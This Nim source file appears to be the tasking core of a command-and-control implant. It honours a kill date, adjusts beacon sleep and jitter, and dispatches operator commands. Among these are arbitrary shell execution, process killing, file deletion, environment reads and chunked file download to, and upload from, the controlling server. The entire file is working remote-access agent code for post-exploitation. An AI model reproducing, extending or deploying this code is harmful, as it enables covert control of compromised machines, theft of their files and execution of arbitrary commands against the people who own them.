import asyncdispatch
import base64
import config
import json
import http
import strformat
import strutils
import times
import task
from os import fileExists
from task import Job
import ../commands/cat
import ../commands/cd
import ../commands/cp
import ../commands/curl
import ../commands/drives
import ../commands/download
import ../commands/getenv
import ../commands/kill
import ../commands/ls
import ../commands/mkdir
import ../commands/mv
import ../commands/ps
import ../commands/pwd
import ../commands/rm
import ../commands/setenv
import ../commands/shell
import ../commands/upload
import ../commands/unsetenv


proc checkDate*(kdate: string) : bool =
   if cmp("yyyy-mm-dd", kdate) == 0:
      result = false
   else:
      let killDate = parse(kdate, "yyyy-MM-dd")
      echo "killdate: ", killDate
      let curDate = now()
      echo "curDate: ", curDate
      if killDate <= curDate:
         echo "Killdate has arrived"
         result = true
      else:
         result = false

proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): Future[tuple[jobs: seq[Job], newConfig: Config]] {.async.} = 
   # Where the magic happens
   # Iterate through both tasks and runningJobs
   # The only running jobs are Upload and Download for now....
   var jobSeq: seq[Job]
   var newConfig = curConfig
   for task in tasks:
      echo "your task is: ", $(task)
      var temp = ""
      var jtemp: Job     
      let parsedJsonTask =  if task.parameters.contains("{"): parseJson(task.parameters) else: %*{}
      jtemp.TaskId = task.id
      # TODO convert thread logic to async procs
      try:
         case task.action.toLower():
            of "cat":
               let spawnResult = await cat.execute(task.parameters)
               temp = temp & spawnResult
               when not defined(release):
                  echo "Spawned cat proc \n"
            of "cd":
               let spawnResult = await cd.execute(task.parameters)
               temp = temp & fmt"Successfully changed working directory to {task.parameters}? : {$(spawnResult)}"
               when not defined(release):
                  echo "Spawned cd proc \n"
            of "cp":
               let spawnResult = await cp.execute(parsedJsonTask["source"].getStr(), parsedJsonTask["destination"].getStr())
               when not defined(release):
                  echo "spawned cp proc\n"
               temp = temp & $(spawnResult)
            of "curl":
               let headers = if parsedJsonTask.hasKey("headers"): parsedJsonTask["headers"].getStr() else: ""
               let body = if parsedJsonTask.hasKey("body"): parsedJsonTask["body"].getStr() else: ""
               let spawnResult = await curl.execute(parsedJsonTask["url"].getStr(), parsedJsonTask["method"].getStr(), headers, body)
               temp = temp & spawnResult
               when not defined(release):
                  echo "Spawned curl proc \n"
            of "download":
               jtemp.Download = true
               let path = parsedJsonTask["file_path"].getStr()
               echo "path for download: ", $(path)
               if len(jtemp.FileId) == 0:
                  if not fileExists(path):
                     temp = temp & "Error file does not exist"
                     jtemp.TotalChunks = 0
                     jtemp.Success = false
                  else:
                     jtemp.Path = await GetPath(path)
                     jtemp.TotalChunks = await GetTotalChunks(path, curConfig.ChunkSize)
                     jtemp.FileSize = await GetFileSize(path)

               if jtemp.ChunkNum != jtemp.TotalChunks:
                  let spawnResult = await download.execute(jtemp.Path, curConfig.ChunkSize, jtemp.ChunkNum, jtemp.TotalChunks, jtemp.FileSize)
                  temp = temp & spawnResult
                  when not defined(release):
                     echo "Spawned download proc \n"
                  inc jtemp.ChunkNum
               else:
                  when not defined(release):
                     echo "Setting downloadChunk to 0"
                  jtemp.ChunkNum = 0
            of "drives":
               let spawnResult = await drives.execute()
               temp = temp & $(spawnResult)
               when not defined(release):
                  echo "Drives has been called"
            of "exit":
               when not defined(release):
                  echo "It's been a fun ride but all good things eventually come to an end..."
               quit(QuitSuccess)
            of "getenv":
               let spawnResult = await getenv.execute()
               temp = temp & $(spawnResult)
               when not defined(release):
                  echo "Getenv has been called"
            of "jobs":
               jtemp.Success = true
               for job in runningJobs:
                  temp = temp & $(job) & "\n"
            of "kill":
               let spawnResult = await kill.execute(parseInt(task.parameters))
               temp = temp & $(spawnResult)
               when not defined(release):
                  echo "spawned kill proc\n"
            of "ls":
               when not defined(release):
                  echo "Inside ls and task.paramaters: ", $(task.parameters)
               let spawnResult = await ls.execute(parsedJsonTask["path"].getStr(), parseBool(parsedJsonTask["recurse"].getStr()))               
               temp = temp & $(spawnResult)
            of "mkdir":
               let spawnResult = await mkdir.execute(task.parameters)
               temp = temp & $(spawnResult)
               when not defined(release):
                  echo "Spawned mkdir proc \n"
            of "mv":
               let spawnResult = await mv.execute(parsedJsonTask["source"].getStr(), parsedJsonTask["destination"].getStr())
               temp = temp & $(spawnResult)
               when not defined(release):
                  echo "spawned cp proc\n"
            of "ps":
               let spawnResult = await ps.execute()
               when not defined(release):
                  echo "spawned ps proc\n"
               temp = temp & $(spawnResult)
            of "pwd":
               let spawnResult = await pwd.execute()
               temp = temp & spawnResult
            of "rm":
               let spawnResult = await rm.execute(task.parameters)
               temp = temp & $(spawnResult)
            of "setenv":
               let params = task.parameters.split(" ")
               let spawnResult = await setenv.execute(params[0], params[1])
               when not defined(release):
                  echo "spawned unsetenev proc\n"
               temp = temp & $(spawnResult)
            of "shell":
               let spawnResult = await shell.execute(task.parameters)
               when not defined(release):
                  echo "spawned shell proc\n"
               temp = temp & spawnResult
            of "sleep":
               # Update and modify newConfig that will be returned with new jitter and interval values if they exist 
               newConfig.Jitter = if parsedJsonTask.hasKey("jitter"): parsedJsonTask["jitter"].getInt() else: curConfig.Jitter
               newConfig.Sleep = if parsedJsonTask.hasKey("interval"): parsedJsonTask["interval"].getInt() else: curConfig.Sleep
               when not defined(release):
                  echo "newJitter: ", newConfig.Jitter
                  echo "newInterval: ", newConfig.Sleep
            of "unsetenv":
               let spawnResult = await unsetenv.execute(task.parameters)
               when not defined(release):
                  echo "spawned unsetenev proc\n"
               temp = temp & $(spawnResult)
            of "upload":
               jtemp.Upload = true
               when not defined(release):
                  echo "inside upload jtemp is: ", $(jtemp)
               if (jtemp.ChunkNum != jtemp.TotalChunks) or (jtemp.ChunkNum == 0 and jtemp.TotalChunks == 0): 
                  let filePath =  parsedJsonTask["remote_path"].getStr()
                  let fileId = parsedJsonTask["file"].getStr()
                  jtemp.Path = filePath
                  jtemp.FileId = fileId
                  when not defined(release):
                     echo "Got file path: ", filePath, " and fileId: ", fileId
                  let uploadJson = %*
                           {
                              "action": "upload",
                              "chunk_size": curConfig.ChunkSize,
                              "file_id": fileId,
                              "chunk_num": jtemp.ChunkNum,
                              "full_path": filePath,
                              "task_id": jtemp.TaskId 
                           }
                  
                  # let resp = await http.Fetch(curConfig, encode(curConfig.PayloadUUID & $(uploadJson)), true) 
                  let resp = when defined(AESPSK): await Fetch(curConfig, $(uploadJson), true) else: await Fetch(curConfig, encode(curConfig.PayloadUUID & $(uploadJson)), true)
                  when not defined(release):
                     echo "resp for upload: ", $(resp)
                  # let parsedJsonresp = parseJson(decode(resp)[36 .. ^1])
                  let parsedJsonresp = when defined(AESPSK): parseJson(resp[36 .. ^1]) else: parseJson(decode(resp)[36 .. ^1]) 
                  jtemp.TotalChunks = parsedJsonresp["total_chunks"].getInt()
                  let uploadChunkData = parsedJsonresp["chunk_data"].getStr()
                  when not defined(release):
                     echo "uploadchunkData: ", $(uploadChunkData)
                  let spawnResult = await upload.execute(uploadChunkData, filePath)
                  when not defined(release):
                     echo "spawned upload proc\n"
                  temp = temp & $(spawnResult)
                  inc jtemp.ChunkNum
            else:
               jtemp.Response = "Command not implemented"
               jtemp.Success = false
               jtemp.Completed = true
               jobSeq.add(jtemp)
               continue
      except:
            let
               e = getCurrentException()
               msg = getCurrentExceptionMsg()
            let error = fmt"An exception has occurred when attempting to do {task.action.toLower()} job: " & repr(e) & " with message " & msg  
            temp = temp & error
            continue
            # TODO make jtemp.Success = to false with a bool flag up top
      jtemp.Success = true
      jtemp.Response = temp
      jtemp.Completed = true
      jobSeq.add(jtemp)

   # Identation matters or you can spend hours debugging...
   when not defined(release):
      echo "inside joblauncher and runningJobs: ", $(runningJobs)
   for job in runningJobs:
      when not defined(release):
         echo "Inside running jobs for loop here is a running job: ", $(job)
      # TODO apply DRY to upload and download compact into two distinct methods!
      var copyJob = job
      try:
         if (job.Download or job.Upload) and (job.ChunkNum != job.TotalChunks):
               if job.Download:
                  let spawnResult = await download.execute(job.Path, curConfig.ChunkSize, job.ChunkNum, job.TotalChunks, job.FileSize)
                  copyJob.Response = spawnResult
                  when not defined(release):
                     echo "Spawned download proc \n"
                  inc copyJob.ChunkNum
               else:
                  let uploadJson = %*
                           {
                              "action": "upload",
                              "chunk_size": curConfig.ChunkSize,
                              "file_id": job.FileId,
                              "chunk_num": job.ChunkNum,
                              "full_path": job.Path,
                              "task_id": job.TaskId 
                           }
                  
                  # let resp = await http.Fetch(curConfig, encode(curConfig.PayloadUUID & $(uploadJson)), true) 
                  # let resp = when defined(AESPSK): $(uploadJson) else: encode(curConfig.PayloadUUID & $(uploadJson), true) 
                  let resp = when defined(AESPSK): await Fetch(curConfig, $(uploadJson), true) else: await Fetch(curConfig, encode(curConfig.PayloadUUID & $(uploadJson)), true)
                  when not defined(release):
                     echo "resp for upload: ", $(resp)
                  # let parsedJsonresp = parseJson(resp[36 .. ^1])
                  let parsedJsonresp = when defined(AESPSK): parseJson(resp[36 .. ^1]) else: parseJson(decode(resp)[36 .. ^1]) 
                  copyJob.TotalChunks = parsedJsonresp["total_chunks"].getInt()
                  let uploadChunkData = parsedJsonresp["chunk_data"].getStr()
                  when not defined(release):
                     echo "uploadchunkData: ", $(uploadChunkData)
                  let spawnResult = await upload.execute(uploadChunkData, job.Path)
                  copyJob.Response = $(spawnResult)
                  when not defined(release):
                     echo "spawned upload proc\n"
                  inc copyJob.ChunkNum
      except:
         let
            e = getCurrentException()
            msg = getCurrentExceptionMsg()
         let error = "An exception has occurred when attempting to do job: " & repr(e) & " with message " & msg  
         when not defined(release):
            echo "error has occurred inside running jobs for loop: ", error
      when not defined(release):
         echo "adding copyJob to jobSeq: ", $(copyJob)
      jobSeq.add(copyJob)

   result = (jobs: jobSeq, newConfig: newConfig)
 